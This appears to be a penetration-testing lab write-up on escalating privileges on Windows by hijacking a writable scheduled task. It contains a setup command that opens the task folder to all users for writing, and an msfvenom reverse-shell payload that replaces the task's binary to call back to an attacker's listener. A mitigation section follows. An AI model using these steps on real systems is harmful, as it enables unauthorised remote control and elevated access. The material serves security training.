# Scheduled Task/Job

## Table of Contents

- [Scheduled Task/Job](#scheduled-taskJob)
  - [Table of Contents](#table-of-contents)
  - [Description](#description)
  - [Lab Setup](#lab-setup)
    - [Manual Lab Setup](#manual-lab-setup)
    - [PowerShell Script Lab Setup](#powershell-script-lab-setup)
  - [Enumeration](#enumeration)
  - [Exploitation](#exploitation)
  - [Mitigation](#mitigation)
  - [References](#references)

## Description

The Task Scheduler is a Windows feature that enables users to automate the execution of tasks or programs at specific times or under particular conditions.

Attackers can exploit pre-configured tasks associated with privileged accounts to gain elevated access. By manipulating these tasks, they can run unauthorized programs, scripts, or commands, thereby exerting more control over the system than intended.

## Lab Setup

### Manual Lab Setup

1) Create a folder named 'Jobs' in the C:\ directory.

2) Download the file [Monitor_AMD64.exe](/Lab-Setup-Binary/Monitor_AMD64.exe) to the 'C:\Jobs' directory.

3) Open a Command Prompt with local Administrator privileges and run the following command to grant write permissions to all built-in users for the 'C:\Jobs' directory:

```
icacls "C:\Jobs" /grant Users:(OI)(CI)M
```

Outcome:

![Grant-Write-Permissions-To-All-Built-in-Users](/Pictures/Taskscheduler-0.png)

4) Then, run this command `taskschd.msc` to open the Task Scheduler.

5) Create a new task on Task Scheduler:

![Create-A-New-Task](/Pictures/Taskscheduler-2.png)

6) Assign a task to the logged-in user to be executed with the highest privileges:

![Create-A-New-Task-2](/Pictures/Taskscheduler-3.png)

7) Select the trigger tab to initiate a scheduled task:

![Create-A-New-Task-3](/Pictures/Taskscheduler-4.png)

8) Configure the task schedule trigger to recur:

![Create-A-New-Task-4](/Pictures/Taskscheduler-5.png)

9) Specify the action that will occur when your task starts:

![Create-A-New-Task-5](/Pictures/Taskscheduler-6.png)

10) Specify the type of action to be performed by a scheduled task:

![Create-A-New-Task-6](/Pictures/Taskscheduler-7.png)

11) In the tab named "Conditions," uncheck all the boxes:

![Create-A-New-Task-7](/Pictures/Taskscheduler-12.png)

12) In the tab named "Settings," check the following boxes as shown in the picture:

![Create-A-New-Task-8](/Pictures/Taskscheduler-13.png)

13) Verify the new schedule task:

![Verify-New-Task](/Pictures/Taskscheduler-8.png)

### PowerShell Script Lab Setup 

Another way to set up the lab with the 'Scheduled Task/Job' scenario is by using the custom PowerShell script named [TaskScheduler.ps1](/Lab-Setup-Scripts/TaskScheduler.ps1).

Open a PowerShelll with local Administrator privileges and run the script:

```
.\TaskScheduler.ps1
```

Outcome:

![Create-A-New-Task-Script-Setup](/Pictures/Taskscheduler-14.png)

### Enumeration

To find all scheduled tasks of the current user using the Command Prompt, you can use the `schtasks` command:

```
schtasks /query /fo LIST /v
```

Outcome:

![Task-Scheduler-Enumeration](/Pictures/Taskscheduler-Enumeration.png)

## Exploitation

1) Use msfvenom to generate a malicious executable (exe) file that can be executed via the 'MagicTask' scheduled task:

```
msfvenom -p windows/x64/shell_reverse_tcp lhost=eth0 lport=1234 -f exe > shell.exe
```

2) Transfer the malicious executable file to victim's machine.

3) Move the malicious executable file to 'C:\Jobs'.

4) Rename the 'Monitor_AMD64.exe' to 'Monitor_AMD64.bak'.

5) Rename the malicious exe (shell.exe) to 'Monitor_AMD64.exe'.

Outcome:

![Task-Scheduler-All-Above-Actions](/Pictures/Taskscheduler-10.png)

6) Open a listener on your Kali machine.

7) Wait five minutes and verify the reverse shell on your Kali machine:

![Task-Scheduler-Verify-Reverse-Shell](/Pictures/Taskscheduler-11.png)

## Mitigation

Set the scheduled tasks to execute with the least privileged account capable of fulfilling the task's requirements. Avoid using system-level or administrator-level accounts unless absolutely necessary. Additionally, regularly review and manage user access control lists (ACLs) to ensure that only authorized users have the ability to create, modify, or delete scheduled tasks.

## References

- [Task Scheduler for developers Microsoft](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page)
